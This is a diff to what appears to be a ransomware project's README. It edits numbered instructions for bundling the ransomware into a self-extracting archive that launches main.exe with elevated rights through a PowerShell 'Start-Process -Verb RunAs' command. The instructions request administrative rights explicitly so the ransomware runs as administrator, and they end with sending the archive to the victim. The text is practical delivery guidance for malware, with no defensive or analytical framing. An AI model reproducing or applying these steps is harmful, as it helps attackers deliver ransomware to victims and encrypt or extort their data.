@@ -22,14 +22,13 @@ If the program does not connect to the server to get the encryption key for the 
 1. Select the folder contains the code and libraries 
 2. Rename the folder to "setup"
 3. Right Click and "Add to archive"
-4. Select archive format on "ZIP" 
-5. Select "Create SFX Archive"
-6. In the "Advanced tab" click on "SFX Options"
-7. Select "Create in the current folder"
-8. Copy "Powershell Start-Process setup/main.exe -Verb RunAs" in the "Launch after installation" section.
-9. In the "Advanced tab" on "SFX Options" check the box "Request Administrative Rights" (Very important, it allows you to run ransomware as an administrator)
-10. Click OK
-11. Send the "SFX Archive" to the victim.
+4. Select "Create SFX Archive"
+5. In the "Advanced tab" click on "SFX Options"
+6. Select "Create in the current folder"
+7. Copy "Powershell Start-Process setup/main.exe -Verb RunAs" in the "Launch after installation" section.
+8. In the "Advanced tab" on "SFX Options" check the box "Request Administrative Rights" (Very important, it allows you to run ransomware as an administrator)
+9. Click OK
+10. Send the "SFX Archive" to the victim.
 
 The advantage of this method of building an archive is that I do not need to request privileges in the code and it also makes it possible to contain all the libraries in a single executable file.
 
